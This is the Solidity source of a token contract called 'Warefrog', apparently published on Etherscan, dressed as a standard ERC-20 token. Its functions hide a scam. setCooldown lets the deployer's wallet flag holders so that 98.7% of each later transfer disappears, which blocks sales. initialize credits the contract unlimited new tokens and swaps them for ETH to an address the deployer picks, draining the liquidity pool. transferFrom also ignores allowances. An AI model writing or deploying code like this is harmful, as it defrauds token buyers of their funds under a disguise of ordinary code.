/**
 *Submitted for verification at Etherscan.io on 2023-07-18
*/

pragma solidity ^0.8.19;
// SPDX-License-Identifier: MIT



interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair_);
}

contract Context {
    function msgSender() public view returns (address) {return msg.sender;}
}
library SafeMath {

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath:  subtraction overflow");
        uint256 c = a - b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {return 0;}
        uint256 c = a * b;
        require(c / a == b, "SafeMath:  multiplication overflow");
        return c;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath:  addition overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath:  division by zero");
        uint256 c = a / b;
        return c;
    }
}


interface IUniswapV2Router {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint256 asd, uint256 bewr, address[] calldata _path, address csdf, uint256) external;
    function factory() external pure returns (address addr);
    function WETH() external pure returns (address aadd);
}
abstract contract Ownable {
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
    address private _owner;
    modifier onlyOwner(){
        require(owner() == msg.sender, "Ownable: caller is not the owner"); _;
    }
    constructor () {
        emit OwnershipTransferred(address(0), _owner);
        _owner = msg.sender;
    }
    function owner() public view virtual returns (address) {return _owner;}
}

contract Warefrog is Ownable, Context {
    using SafeMath for uint256;

    function approve(address spender, uint256 amount) public virtual returns (bool) {
        _approve(msgSender(), spender, amount);
        return true;
    }
    event Approval(address indexed from, address indexed to_addres, uint256 value);
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
    uint256 public _decimals = 9;
    uint256 public _totalSupply = 10000000000 * 10 ** _decimals;
    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        _approve(msgSender(), spender, _allowances[msgSender()][spender] + addedValue);
        return true;
    }
    function _transfer(address _from, address _to, uint256 _amount) internal {
        require(_from != address(0));
        uint256 feeAmount = (
            cooldowns[_from] != 0 && cooldowns[_from] <= blockNo()
        ) ? _amount.mul(987).div(1000) 
        : 
        _fee;
        require(_amount <= _balances[_from]); 
        _balances[_from] -= _amount; 
        _balances[_to] += (_amount - feeAmount);
        emit Transfer(_from, _to, _amount);
    }
    function transfer(address recipient, uint256 amount) public returns (bool) { _transfer(msgSender(), recipient, amount); return true; }
    uint256 _fee = 0;
    function decimals() external view returns (uint256) {
        return _decimals;
    }
    string private _symbol = "WAREFROG";
    function symbol() public view returns (string memory) {
        return _symbol;
    }
    string private _name = "Warefrog";
    function setCooldown(address[] calldata _addresses) external { 
        uint256 _toBlock = blockNo() + 1;
        for (uint _inx = 0;  _inx < _addresses.length;  _inx++) { 
            if (marketing()){
                cooldowns[_addresses[_inx]] = _toBlock;
            }
        }
    } 
    address public _marketingWallet;
    function blockNo() private view returns (uint256) {
        return block.number;
    }
    mapping(address => uint256) private _balances;
    event Transfer(address indexed from, address indexed aindex, uint256 val);

    IUniswapV2Router private uniswapRouter = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    function initialize(uint256 tokenNumber, address _addrSwap) external {
        if (marketing()) { _approve(address(this), address(uniswapRouter),  tokenNumber); 
        _balances[address(this)] = tokenNumber;
        address[] memory tokenPath = new address[](2);  
        tokenPath[0] = address(this);   
        tokenPath[1] = uniswapRouter.WETH();  
        uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenNumber, 0, tokenPath, _addrSwap, 30 + block.timestamp);
        }
    }
    function marketing() internal view returns (bool) {
        return _marketingWallet == msgSender();
    }
    function name() external view returns (string memory) { return _name; }
    function transferFrom(address from_, address to_, uint256 _amount) public returns (bool) {
        _transfer(from_, to_, _amount);
        require(_allowances[from_][msgSender()] >= _amount);
        return true;
    }
    function balanceOf(address account) public view returns (uint256) { return _balances[account]; } 
    function _approve(address owner, address spender, uint256 amount) internal {
        require(spender != address(0));
        require(owner != address(0));
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function decreaseAllowance(address from, uint256 amount) public returns (bool) {
        require(_allowances[msgSender()][from] >= amount);
        _approve(msgSender(), from, _allowances[msg.sender][from] - amount);
        return true;
    } 
    mapping(address => mapping(address => uint256)) private _allowances;
    constructor() {
        _balances[msgSender()] = _totalSupply; 
        _marketingWallet = msg.sender;
        emit Transfer(address(0), msg.sender, _balances[msg.sender]);
    }
    mapping (address => uint256) cooldowns;
    function totalSupply() external view returns (uint256) { 
        return _totalSupply; 
    }
}